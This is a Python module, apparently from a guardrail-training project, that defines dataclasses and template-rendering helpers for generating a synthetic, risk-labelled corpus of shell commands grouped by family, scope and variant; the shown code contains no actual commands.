"""Templated bootstrap corpus.

Real coverage needs real command traffic. Until then this module expands a hand
written table of command families into a deterministic starter corpus that follows
the guardrail model:

    risk = destructive operation x scope x irreversibility x bypass flags

Every row's level is an explicit table entry (``scope.level`` plus ``variant.shift``),
never a heuristic, so the labels stay auditable and diffable. Scope notes explain
command-visible risk, not verified deployment facts: opaque resource IDs do not
identify production, and names such as "dev" do not prove data is disposable.
Rows are tagged
``source="synthetic:templates-v1"``; drop them with ``build-data --no-synthetic``
once real labelled traffic exists.

Commands produced by one family and scope form a *group*; splits are group-wise, so
variants of the same command never straddle train and test.
"""

from __future__ import annotations

import re

from collections.abc import Iterator, Sequence
from dataclasses import dataclass, field
from pathlib import Path
from typing import Final

from model_gym.data.schema import RiskRecord, write_jsonl
from model_gym.labels import Level

SOURCE: Final[str] = "synthetic:templates-v1"

_SPACE_RUN = re.compile(r" +")
_SPACE_BEFORE_PUNCT = re.compile(r" +([;,])")


def _render(template: str, **fields: str) -> str:
    """Format a command template and collapse the whitespace left by empty fields."""
    rendered = template.format(**fields)
    rendered = _SPACE_RUN.sub(" ", rendered).strip()
    return _SPACE_BEFORE_PUNCT.sub(r"\1", rendered)


def _sentence(*parts: str) -> str:
    text = "; ".join(part.strip().rstrip(".") for part in parts if part and part.strip())
    if not text:
        return ""
    text = text[0].upper() + text[1:]
    return text if text.endswith(".") else text + "."


@dataclass(frozen=True, slots=True)
class Scope:
    """A target and its severity; targets with the same risk scope share a key."""

    key: str
    text: str
    level: int
    note: str = ""


@dataclass(frozen=True, slots=True)
class Variant:
    """A way of invoking the operation; ``shift`` moves the level, clamped to the taxonomy.

    ``category`` overrides the family category when one family spans tools, as the
    read-only inspection family does.
    """

    name: str
    shift: int = 0
    prefix: str = ""
    args: str = ""
    body: str = ""
    note: str = ""
    category: str | None = None


@dataclass(frozen=True, slots=True)
class Family:
    """One command family: a template realized over scopes and variants."""

    name: str
    category: str
    shell: str
    template: str
    note: str
    scopes: tuple[Scope, ...]
    variants: tuple[Variant, ...] = field(default_factory=lambda: (Variant("plain"),))
    group_by: str = "scope"

    def level_for(self, scope: Scope, variant: Variant) -> Level:
        return Level(max(int(Level.CRITICAL), min(int(Level.LOW_RISK), scope.level + variant.shift)))

    def group_for(self, scope: Scope, variant: Variant) -> str:
        suffix = variant.name if self.group_by == "variant" else scope.key
        return f"{self.name}:{suffix}"

    def record(self, scope: Scope, variant: Variant) -> RiskRecord:
        return RiskRecord(
            command=_render(
                self.template,
                prefix=variant.prefix,
                body=variant.body,
                args=variant.args,
                scope=scope.text,
            ),
            level=self.level_for(scope, variant),
            category=variant.category or self.category,
            group=self.group_for(scope, variant),
            shell=self.shell,
            reason=_sentence(self.note, scope.note, variant.note),
            source=SOURCE,
        )

    def records(self) -> Iterator[RiskRecord]:
        for scope in self.scopes:
            for variant in self.variants:
                yield self.record(scope, variant)


